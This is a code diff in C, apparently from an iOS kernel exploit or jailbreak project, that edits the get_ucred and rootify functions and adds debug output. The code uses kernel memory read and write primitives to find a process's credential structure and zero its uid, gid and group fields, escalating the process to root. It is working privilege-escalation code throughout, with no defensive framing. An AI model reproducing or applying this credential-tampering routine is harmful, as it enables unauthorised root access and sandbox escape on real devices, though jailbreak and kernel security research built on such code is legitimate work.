@@ -62,17 +62,22 @@ void unborrow_ucreds(pid_t to_pid, uint64_t to_ucred) {
 uint64_t get_ucred(uint64_t proc) {
     uint64_t ucred = 0;
     if(off_p_ucred == 0){
-        uint64_t kslide = get_kslide();
-        uint64_t ro = kread64(proc + kslide + 0x20);
-        printf("[i] Kernel ro: 0x%llx\n", ro);
-        uint64_t ucred_addr = kread64(ro + 0x20);
-        printf("[i] Kernel ucred addr: 0x%llx\n", ucred_addr);
-        ucred = kread64(ucred_addr);
-        return ucred;
+        uint64_t self_ro = kread64(proc + 0x20);
+        printf("[DEBUG] self ro: 0x%llx\n", self_ro);
+        uint64_t self_ucred = kread64(self_ro + 0x20);
+        printf("[DEBUG] self ucred: 0x%llx\n", self_ucred); //ucred
+        uint64_t kernproc = get_kernproc();
+        printf("[DEBUG] Kernel proc: 0x%llx\n", kernproc);
+        uint64_t kern_ro = kread64(kernproc + 0x20);
+        printf("[DEBUG] Kernel ro: 0x%llx\n", kern_ro);
+        uint64_t kern_ucred = kread64(kern_ro + 0x20);
+        printf("[DEBUG] Kernel ucred: 0x%llx\n", kern_ucred); //kern_ucred
+        uint64_t proc_set_ucred = off_proc_set_ucred;
+        proc_set_ucred += get_kslide(); //proc_set_ucred
+        printf("[DEBUG] Kernel set_ucred: 0x%llx\n", proc_set_ucred); //func:
+        ucred = self_ucred;
     } else {
         ucred = kread64(proc + off_p_ucred);
-        printf("[i] Kernel ucred:  0x%llx\n", ucred);
-        return ucred;
     }
     return ucred;
 }
@@ -82,9 +87,8 @@ bool rootify(pid_t pid) {
 
     uint64_t proc = proc_of_pid(pid);
     printf("[i] Kernel proc:  0x%llx\n", proc);
-    uint64_t ucred = kread64(proc + off_p_ucred);
+    uint64_t ucred = get_ucred(proc);
     printf("[i] Kernel ucred:  0x%llx\n", ucred);
-    
     //make everything 0 without setuid(0), pretty straightforward.
     kwrite32(proc + off_p_uid, 0);
     kwrite32(proc + off_p_ruid, 0);
@@ -97,6 +101,18 @@ bool rootify(pid_t pid) {
     kwrite32(ucred + off_u_cr_groups, 0);
     kwrite32(ucred + off_u_cr_rgid, 0);
     kwrite32(ucred + off_u_cr_svgid, 0);
+    
+    printf("[DEBUG] proc + off_p_uid:  0x%x\n", kread32(proc + off_p_uid));
+    printf("[DEBUG] proc + off_p_ruid: 0x%x\n", kread32(proc + off_p_ruid));
+    printf("[DEBUG] proc + off_p_gid:  0x%x\n", kread32(proc + off_p_gid));
+    printf("[DEBUG] proc + off_p_rgid: 0x%x\n", kread32(proc + off_p_rgid));
+    printf("[DEBUG] ucred + off_u_cr_uid:     0x%x\n", kread32(ucred + off_u_cr_uid));
+    printf("[DEBUG] ucred + off_u_cr_ruid:    0x%x\n", kread32(ucred + off_u_cr_ruid));
+    printf("[DEBUG] ucred + off_u_cr_svuid:   0x%x\n", kread32(ucred + off_u_cr_svuid));
+    printf("[DEBUG] ucred + off_u_cr_ngroups: 0x%x\n", kread32(ucred + off_u_cr_ngroups));
+    printf("[DEBUG] ucred + off_u_cr_groups:  0x%x\n", kread32(ucred + off_u_cr_groups));
+    printf("[DEBUG] ucred + off_u_cr_rgid:    0x%x\n", kread32(ucred + off_u_cr_rgid));
+    printf("[DEBUG] ucred + off_u_cr_svgid:   0x%x\n", kread32(ucred + off_u_cr_svgid));
 
     return (kread32(proc + off_p_uid) == 0) ? true : false;
     return false;
